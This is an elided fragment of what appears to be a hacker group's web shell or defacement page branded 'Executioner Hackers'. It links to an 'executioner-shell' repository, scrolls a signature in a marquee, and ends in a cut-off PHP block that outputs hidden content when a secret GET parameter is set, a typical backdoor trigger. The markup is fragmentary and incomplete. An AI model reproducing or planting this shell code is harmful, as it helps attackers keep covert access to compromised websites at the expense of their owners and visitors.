	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				<title>Executioner Hackers</title>

			<link rel="icon" href="https://raw.githubusercontent.com/Executioner-Hackers/executioner-shell/main/Capture.JPG" />
	...
	color:#ea2027
		...
		<body>
			<header>
				...
				<div class="q x w">
					&#8212; Ajaz Hunter &#8212; #2&669$ &#8212; &eb43#4$ &#8212; *7&5h^% &#8212; *hgf%43 &#8212; 8^5#2 &#8212;
				</div>
			...
			<footer class="x">
				<marquee>&copy;Executioner Hackers</marquee>
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
